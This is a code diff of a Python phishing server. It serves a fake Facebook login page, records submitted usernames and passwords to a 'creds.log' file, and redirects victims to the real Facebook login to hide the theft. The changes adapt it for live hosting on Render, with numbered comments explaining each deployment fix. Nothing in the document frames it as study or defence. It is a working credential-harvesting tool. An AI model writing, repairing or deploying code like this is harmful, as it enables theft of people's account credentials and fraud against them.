@@ -1,26 +1,23 @@
 import http.server
 import socketserver
 import urllib.parse
-import ssl
 import logging
 import os
 
-# --- Render-Friendly Config ---
-# Corrected: Added quotes around "PORT"
-PORT = int(os.environ.get("PORT", 8080)) 
+# 1. ALIGNMENT: Render defines the port in an environment variable named "PORT"
+# We must use quotes around "PORT" and "0.0.0.0"
+PORT = int(os.environ.get("PORT", 10000)) 
 LOG_FILE = "creds.log"
 HTML_FILE = "facebook_login.html"
 
-USE_SSL = False 
-CERT_FILE = "server.crt"
-KEY_FILE = "server.key"
-
-# Corrected: Added quotes around the format string
+# 2. ALIGNMENT: Render terminates SSL at the load balancer. 
+# Your internal code should run as standard HTTP.
 logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")
 
 class PhishHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        # Corrected: Added quotes around paths and content-type
+        # 3. ALIGNMENT: Render's health checker pings "/" to see if your app is alive.
+        # We ensure "/" returns a 200 OK status.
         if self.path == "/" or self.path == f"/{HTML_FILE}":
             self.send_response(200)
             self.send_header("Content-type", "text/html")
@@ -29,13 +26,13 @@ class PhishHandler(http.server.SimpleHTTPRequestHandler):
                 with open(HTML_FILE, "rb") as f:
                     self.wfile.write(f.read())
             else:
-                self.wfile.write(b"Error: Login page not found on server.")
+                self.wfile.write(b"Server is live. (facebook_login.html missing)")
         else:
+            # Fallback for other files (CSS, JS)
             super().do_GET()
 
     def do_POST(self):
-        # Corrected: Added quotes around Content-Length
-        content_length = int(self.headers["Content-Length"])
+        content_length = int(self.headers.get("Content-Length", 0))
         post_data = self.rfile.read(content_length).decode()
         params = urllib.parse.parse_qs(post_data)
         
@@ -46,29 +43,33 @@ class PhishHandler(http.server.SimpleHTTPRequestHandler):
         logging.info(log_msg)
         print(log_msg)
         
+        # Redirect back to real Facebook
         self.send_response(302)
         self.send_header("Location", "https://www.facebook.com/login/?error=invalid")
         self.end_headers()
 
     def log_message(self, format, *args):
+        # Keep logs clean in Render console
         pass
 
 def run_server():
+    # 4. ALIGNMENT: Must bind to host 0.0.0.0 (as a string)
+    # allow_reuse_address prevents "Address already in use" errors on redeploy
     socketserver.TCPServer.allow_reuse_address = True
-    # Corrected: Added quotes around the 0.0.0.0 IP address
-    with socketserver.TCPServer(("0.0.0.0", PORT), PhishHandler) as httpd:
-        proto = "HTTP"
-        print(f"[+] {proto} Phishing Server live on port {PORT}")
+    server_address = ("0.0.0.0", PORT)
+    
+    with socketserver.TCPServer(server_address, PhishHandler) as httpd:
+        print(f"[+] Phishing Server aligned with Render requirements.")
+        print(f"[+] Listening on {server_address[0]}:{server_address[1]}")
         try:
             httpd.serve_forever()
-        except Exception as e:
-            print(f"Server Error: {e}")
+        except KeyboardInterrupt:
             httpd.server_close()
 
 if __name__ == "__main__":
-    # Extra safety: Create the HTML file if you forgot to upload it
+    # Create the HTML file if it doesn't exist so the server doesn't error out
     if not os.path.exists(HTML_FILE):
         with open(HTML_FILE, "w") as f:
-            f.write("<html><body><h1>Facebook Login Page Simulation</h1><form method='POST'><input name='username'><input name='password' type='password'><input type='submit'></form></body></html>")
+            f.write("<html><body><form method='POST'>User:<input name='username'>Pass:<input name='password' type='password'><input type='submit'></form></body></html>")
     
     run_server()
